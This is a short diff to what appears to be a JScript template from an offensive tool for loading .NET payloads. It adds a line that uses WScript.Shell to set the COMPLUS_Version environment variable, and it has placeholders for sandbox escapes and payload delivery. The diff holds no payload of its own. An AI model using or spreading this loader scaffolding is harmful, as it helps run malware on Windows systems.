@@ -1,4 +1,5 @@
 function setversion() {
+new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
 }
 function debug(s) {}
 function base64ToStream(b) {
@@ -284,7 +285,7 @@ try {
 
 %SANDBOX_ESCAPES%
 %DELIVERY%
-
+	
 } catch (e) {
     debug(e.message);
 }
